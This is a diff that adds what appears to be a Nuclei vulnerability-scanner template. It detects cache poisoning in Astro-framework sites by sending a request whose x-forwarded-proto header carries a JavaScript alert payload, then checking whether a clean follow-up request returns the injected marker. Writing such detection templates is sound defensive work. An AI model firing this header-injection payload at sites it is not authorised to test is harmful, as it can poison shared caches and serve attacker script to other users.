@@ -1,0 +1,29 @@
+id: astro-cache-posioning-2
+
+info:
+  name: Astro Cache Posioning 
+  author: omkar7505
+  severity: high
+  description: |
+    This template checks for Astro Cache Poisoning vulnerability. An attacker can exploit this vulnerability to poison the cache of a web application using the Astro framework. By manipulating the cache, an attacker can serve malicious content to users, leading to potential security risks such as data theft, session hijacking, or distribution of malware.
+  tags: omkar7505,cache
+
+variables:
+  rand: "{{rand_text_numeric(5)}}"
+  
+http:
+  - raw:
+      - |
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        x-forwarded-proto: javascript:/links#/;alert('omkar7505')//
+
+      - |
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "omkar7505")'
